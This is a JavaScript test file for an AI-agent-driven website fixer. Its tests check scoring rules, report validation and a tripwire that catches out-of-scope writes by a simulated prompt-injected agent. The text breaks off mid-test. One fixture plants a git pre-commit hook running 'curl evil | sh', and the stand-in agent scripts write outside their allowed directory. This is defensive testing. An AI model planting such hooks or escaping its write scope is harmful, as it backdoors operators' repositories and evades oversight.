#!/usr/bin/env node
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readlinkSync,
  readFileSync,
  renameSync,
  rmSync,
  statSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import {
  assert,
  run,
  runAsync,
  repoRoot,
  tmp,
  runSuite,
  cleanStaleNpxRegressionTrees,
  packTarball,
  noUpdateEnv,
  SKIP_DIRS,
} from "./test-helpers.mjs";
import { snapshotTree, diffTrees } from "../runner/write-scope.mjs";

// scoreReport's (correct) refusal to score incomplete atomic coverage killed the
// whole fix run with an unhandled throw - including on every report written
// before the coverage contract existed, which has no `coverage` field at all.
// Those are exactly the reports most in need of fixing.
export function testFixSurvivesUnscoreableReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  // Two shapes that scoreReport refuses: a partial run, and a pre-contract run.
  const partial = structuredClone(complete);
  partial.coverage.complete = false;
  partial.status = 'partial';
  const legacy = structuredClone(complete);
  delete legacy.coverage;

  const fixtures = { partial, legacy };
  for (const [name, report] of Object.entries(fixtures)) {
    writeFileSync(join(tmp, `fix-${name}.json`), JSON.stringify(report));
  }

  // --max-iterations 0 drives the whole path (baseline -> snapshot -> compare ->
  // scorecard) without spawning an agent or a browser.
  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fix-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fix-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of Object.keys(fixtures)) {
    const result = runFix(join(tmp, `fix-${name}.json`));
    assert(!/Refusing to score[\s\S]*at scoreReport/.test(result.stderr),
      `fix: ${name} report crashed the hill-climb instead of degrading:\n${result.stderr}`);
    assert(result.stdout.includes('Score unavailable:'),
      `fix: ${name} report did not explain why the score is unavailable:\n${result.stdout}`);
    assert(result.stdout.includes('score N/A'),
      `fix: ${name} report should print score N/A in the climb summary:\n${result.stdout}`);
    assert(result.stdout.includes('outstanding issue-findings to climb down'),
      `fix: ${name} report should still climb on outstanding findings:\n${result.stdout}`);
  }

  // An unscoreable report must never MEET a score goal. evaluateGates treats a
  // null outcome as not-applicable and PASSES it, so an all-null summary from a
  // partial report would otherwise satisfy every --goal-min and stop the climb
  // on a target that was never measured.
  const goalRun = runFix(join(tmp, 'fix-partial.json'), ['--goal-overall', '1', '--goal-min', 'discoverable=1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix: an unscoreable report falsely met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix: the goal failure should name incomplete coverage as the reason:\n${goalRun.stdout}`);

  // The guard must not cost a complete report its score.
  const completeRun = runFix(join(repoRoot, 'examples/playground-report.json'), ['--goal-overall', '1']);
  assert(completeRun.status === 0, `fix: a complete report with a met goal should exit 0:\n${completeRun.stdout}${completeRun.stderr}`);
  assert(completeRun.stdout.includes('PASS: score goal met.'),
    `fix: a complete report should still meet a met goal:\n${completeRun.stdout}`);
  assert(!completeRun.stdout.includes('Score unavailable:'),
    `fix: a complete report must still be scoreable:\n${completeRun.stdout}`);
}


// The atomic coverage contract: a run carrying blocked or not-run checks is
// PARTIAL, never completed. fix.mjs used to decide pass/fail from findings
// alone, so a report with zero findings and five checks that never concluded
// printed "PASS: no outstanding issues remain." and exited 0 - the exact
// absence-of-evidence failure the contract exists to prevent, reintroduced
// through the fix path after the scorecard had closed it.
export function testFixRefusesPassOnIncompleteCoverage() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix coverage: the fixed fixture should have no findings');

  // Zero findings, but five checks never concluded: three blocked, two not-run.
  const partial = structuredClone(clean);
  partial.status = 'partial';
  for (let i = 0; i < 3; i++) {
    partial.checkOutcomes[i].status = 'blocked';
    partial.checkOutcomes[i].reason = 'Auth wall blocked this path';
  }
  for (let i = 3; i < 5; i++) {
    partial.checkOutcomes[i].status = 'not-run';
    partial.checkOutcomes[i].reason = 'Never attempted';
  }
  partial.coverage = { ...partial.coverage, judged: 53, blocked: 3, notRun: 2, complete: false };
  delete partial.overallScore;
  writeFileSync(join(tmp, 'fix-zero-findings-partial.json'), JSON.stringify(partial));

  // The same rows, but the report DECLARES itself complete. The checkOutcomes
  // rows are the authority, not the self-declaration, so this must not pass
  // either. Without that rule a report could buy a pass by lying in one field.
  const lying = structuredClone(partial);
  lying.status = 'completed';
  lying.coverage.complete = true;
  writeFileSync(join(tmp, 'fix-lying-complete.json'), JSON.stringify(lying));

  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcov-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcov-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of ['fix-zero-findings-partial', 'fix-lying-complete']) {
    const result = runFix(join(tmp, `${name}.json`));
    assert(!/^PASS:/m.test(result.stdout),
      `fix coverage: ${name} claimed a pass with unconcluded checks:\n${result.stdout}`);
    assert(result.status === 1,
      `fix coverage: ${name} should exit non-zero, got ${result.status}:\n${result.stdout}`);
    assert(/INCOMPLETE coverage \(3 blocked, 2 not-run\)/.test(result.stdout),
      `fix coverage: ${name} should name the unconcluded checks:\n${result.stdout}`);
    assert(result.stdout.includes('5 unconcluded check(s)'),
      `fix coverage: ${name} should count unconcluded checks in the summary:\n${result.stdout}`);
  }

  // A partial run must not buy a pass through a score goal either.
  const goalRun = runFix(join(tmp, 'fix-lying-complete.json'), ['--goal-overall', '1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix coverage: a partial run met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix coverage: the goal failure should name incomplete coverage:\n${goalRun.stdout}`);

  // A pre-contract report has no coverage accounting at all, so its completeness
  // is unverifiable rather than clean. Zero findings is not enough to pass: the
  // run proceeds (that is the acl fix) but cannot claim a completed audit.
  const legacy = structuredClone(clean);
  delete legacy.coverage;
  delete legacy.overallScore;
  writeFileSync(join(tmp, 'fix-legacy-clean.json'), JSON.stringify(legacy));
  const legacyRun = runFix(join(tmp, 'fix-legacy-clean.json'));
  assert(!/^PASS:/m.test(legacyRun.stdout),
    `fix coverage: a report with no coverage accounting claimed a pass:\n${legacyRun.stdout}`);
  assert(legacyRun.stdout.includes('no coverage accounting in the report'),
    `fix coverage: the legacy report should say its coverage is unverifiable:\n${legacyRun.stdout}`);

  // A genuinely clean run (no findings, every check concluded) still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(cleanRun.status === 0,
    `fix coverage: a clean complete report should exit 0:\n${cleanRun.stdout}${cleanRun.stderr}`);
  assert(cleanRun.stdout.includes('PASS: no outstanding issues remain and every check concluded.'),
    `fix coverage: a clean complete report should pass:\n${cleanRun.stdout}`);
  assert(cleanRun.stdout.includes('0 unconcluded check(s)'),
    `fix coverage: a clean report should report zero unconcluded checks:\n${cleanRun.stdout}`);
}


// A structurally malformed report is invalid INPUT, not a crash (web-uplift-rj2).
// countOutstanding runs before the score safety net, so a non-array
// principleOutcomes or findings used to die with "x.filter is not a function" and
// a raw stack, and a non-array checkOutcomes was silently ignored, which let a
// zero-findings report print PASS. The shape is now validated once, at read time,
// and reported by name.
// web-uplift-cpm: a report whose coverage CLAIMS complete while recording no
// checks used to pass fix mode - "every check concluded" with zero checks, the
// absence-of-evidence failure the atomic coverage contract exists to prevent.
// The publication validator refuses such a report; fix mode now refuses it too,
// by naming the contradiction instead of trusting one asserted field.
export function testFixRefusesContradictoryCoverageClaim() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix cpm: the fixed fixture should have no findings');
  const expected = Number(clean.coverage?.expected ?? 0);
  const rows = (clean.checkOutcomes ?? []).length;
  assert(expected > 0 && rows === expected, `fix cpm: the fixture should account for every check (rows ${rows}, expected ${expected})`);

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcpm-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcpm-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // The bead's repro: zero rows, empty accounting, complete: true.
  const zeroRows = structuredClone(clean);
  zeroRows.checkOutcomes = [];
  zeroRows.coverage = { recorded: 0, judged: 0, missing: 0, complete: true };
  zeroRows.status = 'completed';
  writeFileSync(join(tmp, 'cpm-zero-rows.json'), JSON.stringify(zeroRows));

  // The subtler shape: rows exist, but the accounting claims complete while
  // recording only a fraction of the checks the report expects.
  const shortAccounting = structuredClone(clean);
  shortAccounting.checkOutcomes = shortAccounting.checkOutcomes.slice(0, 5);
  shortAccounting.coverage = { ...shortAccounting.coverage, recorded: 5, judged: 5, complete: true };
  writeFileSync(join(tmp, 'cpm-short-accounting.json'), JSON.stringify(shortAccounting));

  const zeroRun = runFix(join(tmp, 'cpm-zero-rows.json'));
  assert(!/^PASS:/m.test(zeroRun.stdout), `fix cpm: a report claiming complete coverage with zero checks must not pass:\n${zeroRun.stdout}`);
  assert(zeroRun.status === 1, `fix cpm: the zero-check claim should exit non-zero, got ${zeroRun.status}:\n${zeroRun.stdout}`);
  assert(
    /coverage\.complete is true but the report records no checks/.test(zeroRun.stdout),
    `fix cpm: the refusal should name the contradiction:\n${zeroRun.stdout}`,
  );

  const shortRun = runFix(join(tmp, 'cpm-short-accounting.json'));
  assert(!/^PASS:/m.test(shortRun.stdout), `fix cpm: 5 of ${expected} recorded must not pass:\n${shortRun.stdout}`);
  assert(shortRun.status === 1, `fix cpm: the short accounting should exit non-zero, got ${shortRun.status}:\n${shortRun.stdout}`);
  assert(
    new RegExp(`coverage\\.complete is true but only 5 of ${expected} checks are recorded`).test(shortRun.stdout),
    `fix cpm: the refusal should name the shortfall:\n${shortRun.stdout}`,
  );

  // The control: a genuinely complete, zero-finding report still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(
    cleanRun.status === 0 && /PASS: no outstanding issues remain and every check concluded\./.test(cleanRun.stdout),
    `fix cpm: a genuinely complete clean report must still pass:\n${cleanRun.stdout}${cleanRun.stderr}`,
  );
}


export function testFixRejectsMalformedReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixshape-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixshape-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // Present but not an array: a named error, exit 1, no raw TypeError, no PASS.
  const malformed = {
    'shape-principle-outcomes': { principleOutcomes: {} },
    'shape-findings': { findings: {} },
    'shape-findings-string': { findings: 'not an array' },
    'shape-check-outcomes': { checkOutcomes: {} },
    'shape-artifacts': { artifacts: {} },
  };
  for (const [name, patch] of Object.entries(malformed)) {
    const path = join(tmp, `${name}.json`);
    const field = Object.keys(patch)[0];
    writeFileSync(path, JSON.stringify({ ...complete, ...patch }));
    const result = runFix(path);
    assert(result.status === 1,
      `fix shape: ${name} should exit 1, got ${result.status}:\n${result.stdout}${result.stderr}`);
    assert(
      result.stderr.includes(`Invalid report at ${path}: "${field}" must be an array`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
    assert(!/is not a function|is not iterable|Cannot read propert/.test(result.stderr),
      `fix shape: ${name} leaked a raw TypeError:\n${result.stderr}`);
    assert(!/^PASS:/m.test(result.stdout),
      `fix shape: ${name} must not pass:\n${result.stdout}`);
  }

  // A whole file that is not an object at all is the same class of input error.
  for (const [name, body] of [['shape-root-string', '"just a string"'], ['shape-root-array', '[1,2,3]']]) {
    const path = join(tmp, `${name}.json`);
    writeFileSync(path, body);
    const result = runFix(path);
    assert(
      result.status === 1 && result.stderr.includes(`Invalid report at ${path}: expected a JSON object`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
  }

  // The guard must not reject legal reports: absent and null fields stay legal
  // (pre-contract reports have no coverage or checkOutcomes at all), and a clean
  // report still runs through to its pass.
  const nullish = { ...structuredClone(complete), principleOutcomes: null, findings: [] };
  const nullishPath = join(tmp, 'shape-nullish.json');
  writeFileSync(nullishPath, JSON.stringify(nullish));
  const nullishRun = runFix(nullishPath);
  assert(
    nullishRun.status === 0 && !/Invalid report at/.test(nullishRun.stderr),
    `fix shape: null/empty fields must stay legal:\n${nullishRun.stdout}${nullishRun.stderr}`,
  );

  const legacy = structuredClone(complete);
  delete legacy.coverage;
  delete legacy.checkOutcomes;
  const legacyPath = join(tmp, 'shape-legacy.json');
  writeFileSync(legacyPath, JSON.stringify(legacy));
  const legacyRun = runFix(legacyPath);
  assert(
    !/Invalid report at/.test(legacyRun.stderr) && legacyRun.stdout.includes('Baseline:'),
    `fix shape: a pre-contract report must stay legal input:\n${legacyRun.stdout}${legacyRun.stderr}`,
  );
}


// web-uplift-arp: fix mode drives an agent whose prompt context carries untrusted
// page content, so what it writes is scoped to --target by snapshot + refusal
// rather than by the filesystem. See runner/write-scope.mjs for why rooting the
// child's cwd at --target is not an option (the skill's vendored tool path,
// `.web-uplift/evidence/cli.mjs`, is relative to the PROJECT root).
export async function testFixWriteScopeDiffing() {
  const { snapshotTree, diffTrees, escapedChanges, summariseChanges } = await import('../runner/write-scope.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-scope-'));
  try {
    mkdirSync(join(root, 'sub'), { recursive: true });
    mkdirSync(join(root, 'node_modules'), { recursive: true });
    writeFileSync(join(root, 'keep.txt'), 'one');
    writeFileSync(join(root, 'sub', 'gone.txt'), 'bye');
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep');

    const before = snapshotTree(root);
    writeFileSync(join(root, 'keep.txt'), 'one changed');
    writeFileSync(join(root, 'added.txt'), 'new');
    rmSync(join(root, 'sub', 'gone.txt'));
    // web-uplift-dzd: the dependency tree is NO LONGER excluded - it is executed
    // (the CLI the agent spawns imports from it), so a mid-run rewrite of dep.js
    // must be a visible change. The old "ignore excluded trees" policy here was
    // the vulnerability; `reports` is the only blanket exclusion left (covered in
    // testWriteScopeCoversExecutedTrees).
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep changed');
    const after = snapshotTree(root);

    const diff = diffTrees(before, after);
    assert(diff.added.includes('added.txt'), `scope: an added file must be reported, got ${diff.added}`);
    assert(diff.modified.includes('keep.txt'), `scope: a rewritten file must be reported, got ${diff.modified}`);
    assert(diff.deleted.includes(join('sub', 'gone.txt')), `scope: a deleted file must be reported, got ${diff.deleted}`);
    assert(
      diff.modified.includes(join('node_modules', 'dep.js')),
      `scope: a dependency rewrite must be reported (web-uplift-dzd: executed trees are covered), got ${diff.modified}`,
    );

    // Only the declared source root (and the report dir) are legitimate scopes.
    const escaped = escapedChanges(diff, root, [join(root, 'sub')]);
    assert(escaped.some((p) => p.endsWith('added.txt')), `scope: an out-of-scope add must be escaped, got ${escaped}`);
    assert(escaped.some((p) => p.endsWith('keep.txt')), `scope: an out-of-scope edit must be escaped, got ${escaped}`);
    assert(
      !escaped.some((p) => p.endsWith('gone.txt')),
      'scope: a change INSIDE the allowed root must not be called an escape',
    );
    assert(
      summariseChanges(diff).includes('modified 2'),
      `scope: the summary must be bounded and truthful: ${summariseChanges(diff)}`,
    );

    // .git is walked ONLY where an injected agent could plant persistence: a hook
    // that runs on the operator's next commit is the classic backdoor, while the
    // object store is large and noisy. The rule must hold for a .git that sits in an
    // out-of-tree root too, where keys begin with `..` instead of `.git`.
    mkdirSync(join(root, '.git', 'hooks'), { recursive: true });
    mkdirSync(join(root, '.git', 'objects', 'ab'), { recursive: true });
    const beforeGit = snapshotTree(root);
    writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
    writeFileSync(join(root, '.git', 'objects', 'ab', 'blob'), 'noise');
    const gitDiff = diffTrees(beforeGit, snapshotTree(root));
    assert(
      gitDiff.added.includes(join('.git', 'hooks', 'pre-commit')),
      `scope: a planted .git hook must be detected, got ${JSON.stringify(gitDiff.added)}`,
    );
    assert(
      !gitDiff.added.some((p) => p.startsWith(join('.git', 'objects'))),
      'scope: the git object store must stay excluded, or every run walks it',
    );

    // A --target outside the invocation directory is still walked, so its edits
    // appear in the diff instead of reading as "no file changes". A .git inside
    // that external root must obey the same policy as one at the base.
    const outsideTarget = mkdtempSync(join(tmpdir(), 'web-uplift-target-'));
    try {
      writeFileSync(join(outsideTarget, 'page.html'), 'before');
      mkdirSync(join(outsideTarget, '.git', 'hooks'), { recursive: true });
      mkdirSync(join(outsideTarget, '.git', 'objects', 'cd'), { recursive: true });
      const b2 = snapshotTree(root, { extraRoots: [outsideTarget] });
      writeFileSync(join(outsideTarget, 'page.html'), 'after');
      writeFileSync(join(outsideTarget, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nevil\n');
      writeFileSync(join(outsideTarget, '.git', 'objects', 'cd', 'blob'), 'noise');
      const d2 = diffTrees(b2, snapshotTree(root, { extraRoots: [outsideTarget] }));
      assert(
        d2.modified.some((p) => p.endsWith(join('page.html'))),
        `scope: an out-of-tree --target must still be diffed, got ${JSON.stringify(d2)}`,
      );
      assert(
        d2.added.some((p) => p.endsWith(join('.git', 'hooks', 'pre-commit'))),
        `scope: an out-of-tree .git hook must be detected, got ${JSON.stringify(d2.added)}`,
      );
      assert(
        !d2.added.some((p) => p.includes(join('.git', 'objects'))),
        'scope: an out-of-tree git object store must stay excluded',
      );
    } finally {
      rmSync(outsideTarget, { recursive: true, force: true });
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// "The guard exists" is not evidence that an out-of-scope write is caught, so the
// refusal is driven end-to-end with a stand-in agent CLI that takes the shape of a
// prompt-injected iteration: one legitimate in-scope edit plus one write somewhere
// it was never pointed at.
export function testFixModeRefusesOutOfScopeWrites() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixscope-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    // One drive of fix mode from `root` as the project root, with a stand-in
    // `claude` on PATH, so the only thing that differs between the two scenarios
    // is the agent's out-of-scope write.
    const drive = (outName, agentBody) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${agentBody}\n`);
      chmodSync(bin, 0o755);
      const res = run(
        process.execPath,
        [
          join(repoRoot, 'fixer', 'fix.mjs'),
          '--target', 'src',
          '--audit-url', 'http://example.test/',
          '--agent', 'claude',
          '--max-iterations', '1',
          '--findings', findings,
          // The tool does not sandbox by itself: the operator asserts the boundary
          // and the tripwire is what this test exercises.
          '--isolation', 'host-permission-model',
          '--out', outName,
          '--reports-root', `reports-${outName}`,
        ],
        { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
      );
      return { res, outDir: join(root, outName) };
    };

    const edit = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;

    // Scenario A: the escape. Non-zero exit, a loud refusal, and the exact path.
    const a = drive('out-escape', `${edit}\nprintf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}\necho '{}'`);
    assert(a.res.status !== 0, `fix scope: an out-of-scope write must fail the run (exit ${a.res.status})\n${a.res.stdout}\n${a.res.stderr}`);
    assert(/CONFINEMENT FAILURE/.test(a.res.stderr), `fix scope: the refusal must be reported, not silent:\n${a.res.stderr}`);
    const esc = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      esc.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded, got ${JSON.stringify(esc.escapedOutsideScope)}`,
    );
    assert(
      !esc.escapedOutsideScope.some((p) => p.endsWith('index.html')),
      'fix scope: the in-scope edit must not be mistaken for an escape',
    );
    const diff = JSON.parse(readFileSync(join(a.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diff.changed.modified.includes(join('src', 'index.html')),
      `fix scope: the per-iteration diff must record the in-scope edit, got ${JSON.stringify(diff.changed)}`,
    );

    // Scenario B (positive control): the identical drive with ONLY the in-scope
    // edit must not refuse at all, so scenario A's failure is attributable to the
    // out-of-scope write rather than to the harness. The exit code here is 1 for
    // the ordinary reason - this fake agent never writes a report, so the run stops
    // with a named "no usable report" failure rather than a crash - which is why
    // the assertion is on the refusal artifacts, not on the exit code.
    const b = drive('out-clean', `${edit}\necho '{}'`);
    assert(!/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: an in-scope-only run must not refuse:\n${b.res.stderr}`);
    assert(
      !existsSync(join(b.outDir, 'confinement-escape.json')),
      'fix scope: an in-scope-only run must not write a confinement-escape artifact',
    );
    assert(existsSync(join(b.outDir, 'iter-1-diff.json')), 'fix scope: the per-iteration diff must be written on a clean run too');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}


// The edges a review found: an out-of-scope write followed by a crashing agent,
// an unmonitored baseline audit, and the legitimate-run shapes that must NOT be
// refused. Each drives the real fixer with a stand-in agent CLI.
export function testFixModeScopeEdgeCases() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixedges-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    const drive = ({ outName, body, extraArgs = [], skipFindings = false }) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${body}\n`);
      chmodSync(bin, 0o755);
      const args = [
        join(repoRoot, 'fixer', 'fix.mjs'),
        '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
        '--max-iterations', '1',
        ...(skipFindings ? [] : ['--findings', findings]),
        // See above: the tripwire is what is under test here, not a boundary.
        '--isolation', 'host-permission-model',
        '--out', outName, '--reports-root', `reports-${outName}`,
        ...extraArgs,
      ];
      const res = run(process.execPath, args, { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
      return { res, outDir: join(root, outName) };
    };

    const inScope = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;
    const outside = `printf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}`;
    const report = (outName) => `cp ${JSON.stringify(findings)} ${JSON.stringify(join(root, outName, 'report.json'))}`;

    // A: the write lands and THEN the agent exits non-zero. The rejection must not
    // abort the process before the diff and the escape diagnosis are computed.
    const a = drive({ outName: 'edge-crash', body: `${inScope}\n${outside}\nexit 7` });
    assert(a.res.status !== 0, `fix scope: a crashing agent must still fail the run (exit ${a.res.status})`);
    assert(
      /CONFINEMENT FAILURE/.test(a.res.stderr),
      `fix scope: an escape must be diagnosed even when the agent then crashes:\n${a.res.stderr}`,
    );
    assert(
      existsSync(join(a.outDir, 'iter-1-diff.json')),
      'fix scope: the per-iteration diff must exist even when the agent crashed',
    );
    const escA = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escA.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded despite the crash, got ${JSON.stringify(escA.escapedOutsideScope)}`,
    );
    assert(typeof escA.agentError === 'string' && escA.agentError.length > 0, 'fix scope: the agent error must be recorded in the diff record');
    // A refused run must not be published as a result: no retained after-run and
    // no scorecard, or a tampered tree becomes the newest run for that host.
    assert(/Not recording a retained run/.test(a.res.stdout), `fix scope: a refused run must record no result:\n${a.res.stdout}`);
    // Nothing at all is published by a refused run: no run dirs and no `latest`,
    // so a consumer reading the host's newest result cannot see the refused tree.
    const crashRoot = join(root, 'reports-edge-crash');
    const crashHosts = existsSync(crashRoot) ? readdirSync(crashRoot) : [];
    assert(crashHosts.length === 0, `fix scope: a refused run must publish nothing, got ${JSON.stringify(crashHosts)}`);
    assert(!existsSync(join(crashRoot, 'example_test', 'latest')), 'fix scope: a refused run must not move latest');

    // H (the missing half): a climb that reaches zero outstanding issues must
    // still publish - exit 0, a retained after run, a `latest` pointing at it, and
    // a scorecard. Without this, a guard that broke every successful run would
    // pass the assertions above.
    const h = drive({
      outName: 'edge-pass',
      body: `${inScope}\ncp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'edge-pass', 'report.json'))}`,
    });
    assert(h.res.status === 0, `fix scope: a successful climb must exit 0 (got ${h.res.status})\n${h.res.stdout}${h.res.stderr}`);
    assert(/^PASS:/m.test(h.res.stdout), `fix scope: a successful climb must say PASS:\n${h.res.stdout}`);
    assert(!/CONFINEMENT FAILURE/.test(h.res.stderr), 'fix scope: a successful climb must not refuse');
    const passHosts = readdirSync(join(root, 'reports-edge-pass'));
    assert(passHosts.length === 1, `fix scope: a successful climb publishes one host dir, got ${JSON.stringify(passHosts)}`);
    const passHostRoot = join(root, 'reports-edge-pass', passHosts[0]);
    const passEntries = readdirSync(passHostRoot);
    assert(passEntries.some((e) => e.endsWith('-after')), `fix scope: a successful climb records an after run, got ${JSON.stringify(passEntries)}`);
    assert(existsSync(join(passHostRoot, 'latest')), 'fix scope: a successful climb must move latest');
    assert(
      readlinkSync(join(passHostRoot, 'latest')).endsWith('-after'),
      'fix scope: latest must point at the after run',
    );
    assert(existsSync(join(passHostRoot, 'scorecard.html')), 'fix scope: a successful climb must publish a scorecard');

    // B: the baseline audit (no --findings) spawns the same write-capable agent
    // under the same untrusted context, so it must be scoped too - otherwise the
    // damage is both unmonitored and baked into iteration 1's clean baseline.
    const b = drive({ outName: 'edge-baseline', skipFindings: true, body: `printf 'pwned' > ${JSON.stringify(join(root, 'baseline-outside.txt'))}` });
    assert(b.res.status !== 0, `fix scope: an escaping baseline audit must fail the run (exit ${b.res.status})`);
    assert(/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: the baseline audit escape must be diagnosed:\n${b.res.stderr}`);
    assert(existsSync(join(b.outDir, 'iter-0-diff.json')), 'fix scope: the baseline audit must produce its own diff record');
    const escB = JSON.parse(readFileSync(join(b.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escB.escapedOutsideScope.some((p) => p.endsWith('baseline-outside.txt')),
      `fix scope: the baseline escaped path must be recorded, got ${JSON.stringify(escB.escapedOutsideScope)}`,
    );

    // C (positive control): an in-scope edit plus a report.json completes the run
    // path normally - no refusal, a diff record, and a climb summary.
    const c = drive({ outName: 'edge-clean', body: `${inScope}\n${report('edge-clean')}` });
    assert(!/CONFINEMENT FAILURE/.test(c.res.stderr), `fix scope: an in-scope run must not refuse:\n${c.res.stderr}`);
    assert(!existsSync(join(c.outDir, 'confinement-escape.json')), 'fix scope: an in-scope run must write no escape artifact');
    assert(/Hill-climb summary/.test(c.res.stdout), `fix scope: an in-scope run must reach the climb summary:\n${c.res.stdout}`);
    assert(existsSync(join(c.outDir, 'iter-1-diff.json')), 'fix scope: an in-scope run must write its per-iteration diff');

    // D: --allow-write is the documented way to permit a legitimate build output
    // instead of tripping the refusal.
    const d = drive({
      outName: 'edge-build',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${report('edge-build')}`,
    });
    assert(
      !/CONFINEMENT FAILURE/.test(d.res.stderr),
      `fix scope: --allow-write dist must permit a build output:\n${d.res.stderr}`,
    );
    const diffD = JSON.parse(readFileSync(join(d.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diffD.changed.added.includes(join('dist', 'bundle.js')),
      `fix scope: an allowed build output must still be recorded in the diff, got ${JSON.stringify(diffD.changed.added)}`,
    );

    // F: a baseline audit that exits 0 without writing report.json used to die on
    // an unguarded readReport - a raw stack where the run should name the problem.
    const f = drive({ outName: 'edge-no-report', skipFindings: true, body: `printf 'nothing' > /dev/null` });
    assert(f.res.status !== 0, `fix scope: a baseline audit with no report must fail the run (exit ${f.res.status})`);
    assert(/Cannot start the climb/.test(f.res.stderr), `fix scope: the baseline failure must be named:\n${f.res.stderr}`);
    assert(
      !/Unhandled|^\s+at .+:\d+:\d+\)?$/m.test(f.res.stderr),
      `fix scope: the baseline failure must not be a raw stack trace:\n${f.res.stderr}`,
    );

    // G: an out-of-tree --allow-write directory is permitted AND walked, so its
    // edits are in the diff instead of silently missing from it.
    const allowTarget = mkdtempSync(join(tmpdir(), 'web-uplift-allow-'));
    try {
      const g = drive({
        outName: 'edge-allow-outside',
        extraArgs: ['--allow-write', allowTarget],
        body: `${inScope}\nprintf 'built' > ${JSON.stringify(join(allowTarget, 'bundle.js'))}\n${report('edge-allow-outside')}`,
      });
